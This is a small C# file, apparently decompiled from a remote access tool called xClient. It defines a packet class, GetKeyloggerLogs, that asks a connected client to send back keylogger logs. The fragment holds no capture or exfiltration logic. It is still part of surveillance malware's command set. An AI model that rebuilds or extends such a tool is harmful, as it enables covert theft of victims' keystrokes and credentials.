using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000097 RID: 151
	[Serializable]
	public class GetKeyloggerLogs : IPacket
	{
		// Token: 0x060003EB RID: 1003 RVA: 0x00003F67 File Offset: 0x00002167
		public void Execute(Client client)
		{
			client.Send<GetKeyloggerLogs>(this);
		}
	}
}
